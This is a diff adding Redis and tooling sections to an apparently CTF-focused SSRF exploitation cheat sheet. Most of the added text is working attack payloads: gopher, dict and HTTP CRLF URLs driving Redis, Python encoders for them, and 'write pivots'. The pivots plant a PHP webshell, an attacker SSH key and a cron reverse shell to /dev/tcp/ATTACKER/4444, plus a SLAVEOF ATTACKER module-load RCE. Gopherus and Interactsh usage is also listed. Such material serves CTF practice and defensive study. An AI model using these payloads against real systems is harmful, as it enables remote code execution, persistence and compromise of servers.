@@ -111,6 +111,30 @@ php://filter/convert.base64-encode/resource=/flag.txt
 gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a
 ```
 
+Targets:
+
+```text
+redis://127.0.0.1:6379
+gopher://127.0.0.1:6379/_
+dict://127.0.0.1:6379/info
+http://127.0.0.1:6379/
+http://redis:6379/
+```
+
+Quick Redis probes:
+
+```text
+INFO
+PING
+CONFIG GET dir
+CONFIG GET dbfilename
+KEYS *
+SCAN 0
+GET flag
+HGETALL flag
+LRANGE flag 0 -1
+```
+
 Write webshell when Redis can write into webroot:
 
 ```text
@@ -142,6 +166,188 @@ for cmd in cmds:
 print("gopher://127.0.0.1:6379/_" + quote(raw))
 ```
 
+Reusable RESP encoder:
+
+```python
+from urllib.parse import quote
+
+def resp(*parts):
+    out = f"*{len(parts)}\r\n"
+    for p in parts:
+        if isinstance(p, str):
+            p = p.encode()
+        out += f"${len(p)}\r\n" + p.decode("latin-1") + "\r\n"
+    return out
+
+raw = "".join([
+    resp("PING"),
+    resp("INFO"),
+])
+
+print("gopher://127.0.0.1:6379/_" + quote(raw, safe=""))
+```
+
+## Redis via dict
+
+`dict://` is not raw TCP. With curl/libcurl it sends:
+
+```text
+CLIENT libcurl VERSION
+COMMAND_FROM_URL_PATH
+QUIT
+```
+
+Redis errors on the first `CLIENT libcurl ...` line, then still processes the command from the path. This usually means one Redis command per SSRF request. Use gopher for multi-command RESP; use dict when gopher is blocked and one command per request is enough.
+
+Examples:
+
+```text
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:6379/PING
+dict://127.0.0.1:6379/CONFIG%20GET%20dir
+dict://127.0.0.1:6379/GET%20flag
+dict://127.0.0.1:6379/HGETALL%20flag
+```
+
+Curl also turns `:` into spaces for DICT paths, which is handy when spaces are filtered:
+
+```text
+dict://127.0.0.1:6379/CONFIG:GET:dir
+dict://127.0.0.1:6379/SET:x:pwned
+dict://127.0.0.1:6379/GET:x
+```
+
+For values with spaces/special chars, quote the Redis inline argument and URL-encode it:
+
+```python
+from urllib.parse import quote
+
+def dict_redis(cmd):
+    return "dict://127.0.0.1:6379/" + quote(cmd, safe="")
+
+print(dict_redis("SET x pwned"))
+print(dict_redis('SET shell "<?php system($_GET[0]); ?>"'))
+```
+
+Webshell with several SSRF requests:
+
+```text
+dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
+dict://127.0.0.1:6379/SET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%20%3F%3E%22
+dict://127.0.0.1:6379/SAVE
+```
+
+If the challenge expects a base64 URL parameter, base64 the full dict URL:
+
+```python
+import base64
+from urllib.parse import quote
+
+url = "dict://127.0.0.1:6379/" + quote("GET flag", safe="")
+print(base64.b64encode(url.encode()).decode())
+```
+
+## Redis via HTTP CRLF
+
+Sometimes gopher is blocked, but the SSRF sink allows `http://127.0.0.1:6379/...` and decodes `%0d%0a` in the path before sending the request. Redis accepts inline commands line by line, so the first HTTP line may error, then injected Redis commands still run.
+
+Shape:
+
+```text
+http://127.0.0.1:6379/%0d%0aPING%0d%0aQUIT%0d%0a
+http://127.0.0.1:6379/%0d%0aSET%20x%20pwned%0d%0aGET%20x%0d%0aQUIT%0d%0a
+```
+
+If spaces are blocked:
+
+```text
+http://127.0.0.1:6379/%0d%0aSET%09x%09pwned%0d%0aQUIT%0d%0a
+http://127.0.0.1:6379/%0aSET%20x%20pwned%0aQUIT%0a
+```
+
+HTTP inline encoder:
+
+```python
+from urllib.parse import quote
+
+cmds = [
+    "PING",
+    "SET x pwned",
+    "GET x",
+    "QUIT",
+]
+
+payload = "\r\n" + "\r\n".join(cmds) + "\r\n"
+print("http://127.0.0.1:6379/" + quote(payload, safe=""))
+```
+
+If the challenge says the URL is base64-encoded before fetch, base64 the final URL, not only the Redis payload:
+
+```python
+import base64
+from urllib.parse import quote
+
+payload = "\r\nSET x pwned\r\nGET x\r\nQUIT\r\n"
+url = "http://127.0.0.1:6379/" + quote(payload, safe="")
+print(base64.b64encode(url.encode()).decode())
+```
+
+Try double-encoding if the first layer decodes once before validation:
+
+```text
+%250d%250aSET%2520x%2520pwned%250d%250aQUIT%250d%250a
+```
+
+## Redis Write Pivots
+
+Webshell:
+
+```text
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET[0]); ?>"
+SAVE
+```
+
+SSH key:
+
+```text
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SET x "\n\nssh-rsa AAAA... attacker\n\n"
+SAVE
+```
+
+Cron:
+
+```text
+CONFIG SET dir /var/spool/cron
+CONFIG SET dbfilename root
+SET x "\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n"
+SAVE
+```
+
+Replica/module RCE when Redis can reach your server and modules are allowed:
+
+```text
+SLAVEOF ATTACKER 6379
+CONFIG SET dir /tmp
+CONFIG SET dbfilename exp.so
+MODULE LOAD /tmp/exp.so
+```
+
+Reality checks:
+
+```text
+Redis protected-mode may block non-loopback clients, but SSRF from localhost can bypass that.
+AUTH/requirepass needs credentials unless app has them in config/env.
+CONFIG may be disabled/renamed on hardened Redis.
+Webshell only works if Redis can write into a served PHP directory.
+Cron/SSH pivots depend on Redis user permissions.
+HTTP CRLF works only if the SSRF client does not reject or normalize CRLF.
+```
+
 ## PHP-FPM / FastCGI
 
 ```text
@@ -151,6 +357,21 @@ print("gopher://127.0.0.1:6379/_" + quote(raw))
 ```
 
 Use `gopherus` or `fastcgi_param SCRIPT_FILENAME /var/www/html/index.php` payloads.
+
+## Tools
+
+Gopherus: https://github.com/tarunkant/Gopherus
+
+```bash
+git clone https://github.com/tarunkant/Gopherus
+cd Gopherus
+python2 gopherus.py --exploit redis
+python2 gopherus.py --exploit fastcgi
+python2 gopherus.py --exploit mysql
+python2 gopherus.py --exploit smtp
+```
+
+Use Gopherus for quick payload shape, then inspect and re-encode the generated URL if the challenge base64-encodes URLs, decodes once before fetching, or blocks `%0d%0a`.
 
 ## Admin Panels
 
@@ -181,6 +402,20 @@ http://PROJECT-SERVICE-1:PORT/
 2. DNS-only: test parser bypasses, redirects, and internal ports by timing.
 3. HTTP callback: pivot to open redirect, gopher, or second sink.
 4. Common second sinks: preview, import URL, webhook, PDF/HTML converter.
+
+## Callback Tools
+
+Interactsh: https://github.com/projectdiscovery/interactsh
+
+```bash
+interactsh-client
+
+# Put the generated domain into the SSRF sink.
+http://TARGET/fetch?url=http://GENERATED.oast.pro/
+http://TARGET/fetch?url=http://redis-6379.GENERATED.oast.pro/
+```
+
+Burp Collaborator works the same way: generate a Collaborator domain, send it through the sink, then check DNS and HTTP interactions. DNS-only callback is still useful because many SSRF clients resolve the host even when the outbound HTTP request is blocked.
 
 ## Domain Redirect
 
